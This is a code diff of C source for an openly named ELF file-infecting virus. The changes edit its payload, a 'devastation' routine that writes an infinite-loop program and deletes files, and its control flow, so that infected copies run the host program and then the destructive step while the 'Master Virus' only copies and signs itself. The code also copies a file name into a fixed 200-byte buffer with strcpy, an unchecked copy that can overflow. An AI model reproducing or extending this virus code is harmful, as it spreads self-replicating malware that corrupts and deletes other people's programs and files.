@@ -13,7 +13,7 @@
 #include <sys/mman.h>
 #include <elf.h>
 
-#define SIZE 22648
+#define SIZE 22696
 #define MAGIC_NUMBER 0x15D25
 #define TEMP_FILENAME ".tempFileImage"
 
@@ -31,8 +31,8 @@ void devastation(char *fileName) {
 	write(1, (char *)banner, sizeof(banner));
 
 	//Malicious hexdump
-	char shellcode[] =
-        "\x6d\x61\x69\x6e\x28\x29\x7b\x77\x68\x69\x6c\x65\x28\x31\x29\x3b\x7d\x0a";
+	char shellcode[] ="main(){while(1);}";
+        // "\x6d\x61\x69\x6e\x28\x29\x7b\x77\x68\x69\x6c\x65\x28\x31\x29\x3b\x7d\x0a";
 	
 	char buf[200];
 	strcpy(buf,fileName);
@@ -63,7 +63,7 @@ void devastation(char *fileName) {
 	}
 	//2. delete the file.c and file
 	else{
-		sleep(0.5);
+		sleep(1);
 		remove(buf);
 	}
 }
@@ -232,12 +232,17 @@ void main(int argc, char *argv[]) {
 		infectHostFile(cleanHostName, virus_fd);
 		 
 
-	if(isOriginalVirus(virus_fd))
+	if(isOriginalVirus(virus_fd)){
 		makeCopyAndAddSignature(argv[0]);
-	else
+		printf("It is Master Virus\n");
+		close(virus_fd);
+	}
+	else{
 		executeHostPart(virus_fd, st.st_mode, st.st_size, argv);
-	close(virus_fd);
-	devastation(argv[0]);
+		close(virus_fd);
+		devastation(argv[0]);
+	}
+	
 }
 
 
